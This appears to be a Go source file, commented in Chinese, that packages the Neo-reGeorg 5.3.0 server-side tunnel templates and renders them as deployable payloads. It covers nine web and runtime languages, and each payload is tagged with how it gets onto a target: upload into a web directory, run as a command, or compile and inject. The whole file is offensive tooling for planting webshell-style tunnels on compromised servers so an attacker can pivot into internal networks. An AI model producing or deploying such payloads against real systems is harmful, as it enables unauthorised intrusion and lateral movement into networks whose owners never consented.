package regeorg

import (
	"embed"
	"fmt"
	"math/rand/v2"
	"sort"
	"strconv"
	"strings"
)

// templates 是上游 Neo-reGeorg 5.3.0 的九个服务端模板，原样收录（未改动）。
//
//go:embed templates/*
var templates embed.FS

// Payload 是一份可投放的服务端载荷。
type Payload struct {
	Kind string // php/jsp/jspx/aspx/ashx/go/js/cs/java
	Name string // 投放时用的文件名
	// Deploy 说明它怎么上去：upload-file（放进 Web 目录按 URL 访问）、
	// run-command（在目标上执行）、compile-inject（编译后注入应用域）。
	Deploy string
	Source []byte
}

// catalog 列出全部模板——用户要求九种都要。
var catalog = []struct{ kind, tpl, name, deploy string }{
	{"php", "tunnel.php", "tunnel.php", "upload-file"},
	{"jsp", "tunnel.jsp", "tunnel.jsp", "upload-file"},
	{"jspx", "tunnel.jspx", "tunnel.jspx", "upload-file"},
	{"aspx", "tunnel.aspx", "tunnel.aspx", "upload-file"},
	{"ashx", "tunnel.ashx", "tunnel.ashx", "upload-file"},
	{"go", "tunnel.go.tpl", "tunnel.go", "run-command"},
	{"js", "tunnel.js", "tunnel.js", "run-command"},
	{"cs", "tunnel.cs", "NeoReGeorg.cs", "compile-inject"},
	{"java", "NeoreGeorg.java", "NeoreGeorg.java", "compile-inject"},
}

// Kinds 列出支持的载荷类型（排序稳定，便于展示）。
func Kinds() []string {
	out := make([]string, 0, len(catalog))
	for _, c := range catalog {
		out = append(out, c.kind)
	}
	sort.Strings(out)
	return out
}

// Generate 生成指定类型载荷的字节。
func Generate(kind string) ([]byte, Payload, error) {
	for _, c := range catalog {
		if c.kind != kind {
			continue
		}
		raw, err := templates.ReadFile("templates/" + c.tpl)
		if err != nil {
			return nil, Payload{}, fmt.Errorf("regeorg: 读模板 %s 失败: %w", c.tpl, err)
		}
		out := render(string(raw))
		p := Payload{Kind: c.kind, Name: c.name, Deploy: c.deploy, Source: []byte(out)}
		return p.Source, p, nil
	}
	return nil, Payload{}, fmt.Errorf("regeorg: 未知载荷类型 %q（可用：%s）", kind, strings.Join(Kinds(), "/"))
}

// GenerateAll 生成全部载荷，按类型名排序。
func GenerateAll() ([]Payload, error) {
	out := make([]Payload, 0, len(catalog))
	for _, k := range Kinds() {
		_, p, err := Generate(k)
		if err != nil {
			return nil, err
		}
		out = append(out, p)
	}
	return out, nil
}

// render 把固定参数替换进模板。占位符清单与上游 neoreg.py 的 generate 一致：
// BASE64 CHARSLIST / BLV_L_OFFSET / HTTPCODE / READBUF / MAXREADSIZE /
// USE_REQUEST_TEMPLATE / START_INDEX / END_INDEX / hello 串。
//
// 不存在的占位符是正常的（例如 java 模板没有 BASE64 CHARSLIST），替换为空操作。
func render(tpl string) string {
	out := strings.ReplaceAll(tpl, "NeoGeorg says, 'All seems fine'", Hello)
	out = strings.ReplaceAll(out, "BASE64 CHARSLIST", TunnelChars)
	out = replaceIdent(out, "HTTPCODE", strconv.Itoa(HTTPCode))
	out = replaceIdent(out, "READBUF", strconv.Itoa(ReadBuf))
	out = replaceIdent(out, "MAXREADSIZE", strconv.Itoa(MaxReadSize))
	out = replaceIdent(out, "USE_REQUEST_TEMPLATE", strconv.Itoa(UseRequestTemplate))
	out = replaceIdent(out, "START_INDEX", strconv.Itoa(StartIndex))
	out = replaceIdent(out, "END_INDEX", strconv.Itoa(EndIndex))
	return replaceIdent(out, "BLV_L_OFFSET", strconv.FormatInt(BLVLOffset, 10))
}

// replaceIdent 只替换**独立标识符**（上游用的是 \bname\b 正则），避免把
// HTTPCODE 这种名字嵌在别的标识符里被误替换。
func replaceIdent(s, name, value string) string {
	var b strings.Builder
	b.Grow(len(s))
	for i := 0; i < len(s); {
		j := strings.Index(s[i:], name)
		if j < 0 {
			b.WriteString(s[i:])
			break
		}
		start := i + j
		end := start + len(name)
		if isIdentBoundary(s, start-1) && isIdentBoundary(s, end) {
			b.WriteString(s[i:start])
			b.WriteString(value)
			i = end
			continue
		}
		b.WriteString(s[i:end])
		i = end
	}
	return b.String()
}

// isIdentBoundary 判断下标处是否是标识符边界（越界算边界）。
func isIdentBoundary(s string, i int) bool {
	if i < 0 || i >= len(s) {
		return true
	}
	c := s[i]
	return !(c == '_' || (c >= '0' && c <= '9') || (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z'))
}

// noiseByte 供 BLV 噪声字段使用：只要能造出互不相同的字节即可，不需要密码学强度。
func noiseByte() byte { return byte(rand.IntN(256)) }
